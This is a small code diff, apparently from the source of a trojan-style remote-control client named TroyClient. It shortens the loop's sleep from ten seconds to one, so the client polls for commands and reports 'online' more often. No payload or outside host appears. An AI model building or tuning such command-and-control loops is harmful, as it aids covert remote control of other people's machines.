@@ -12,7 +12,7 @@ public class TroyClient {
 
         CommandReciver commandReciver = new CommandReciver(init.getWebHandler());
         while (true) {
-            Thread.sleep(10000);
+            Thread.sleep(1000);
             commandReciver.readCommands();
             GetContext.SENDER.send("online", "");
         }
